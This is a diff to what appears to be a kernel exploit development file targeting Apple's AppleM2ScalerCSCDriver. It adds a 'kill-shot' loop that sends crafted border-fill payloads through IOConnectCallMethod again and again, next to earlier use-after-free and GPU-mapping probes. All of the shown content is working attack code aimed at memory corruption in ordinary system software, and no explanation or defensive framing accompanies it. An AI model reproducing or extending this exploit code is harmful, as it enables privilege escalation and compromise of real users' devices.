@@ -12955,6 +12955,31 @@ static void p_blithit(void) {
     LOG("[v76] sweep done (alive)");
 }
 
+
+// V79: isolated border-fill kill-shot loop (glitch correlation test)
+static void p_killshot_only(void) {
+    LOG("[v79] isolated kill-shot loop (watch screen!)");
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) { LOG("[ks] no scaler conn"); return; }
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    uint8_t *req = must_map(0x1000);
+    // wire once
+    craft_transform(req, si, di, 64, 64);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    IOConnectCallMethod(c, 1, NULL, 0, req, 0x1b0, osc, &nosc, NULL, NULL);
+    usleep(50000);
+    for (int i = 0; i < 40; i++) {
+        border_payload(req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
+        kern_return_t kr = IOConnectCallMethod(c, 1, NULL, 0, req, 0x1b0, osc, &nosc, NULL, NULL);
+        LOG("[ks] shot %d -> kr 0x%08x", i, kr);
+        usleep(300000);
+    }
+    LOG("[v79] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -13085,6 +13110,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        p_killshot_only();  // v79: isolated kill-shot loop FIRST
         p_blithit();        // v76: blit + prepared resource sweep
         p_gpuva2();         // v74: sel45 GPU mapping
         p_regdump();        // v73: IORegistry dump
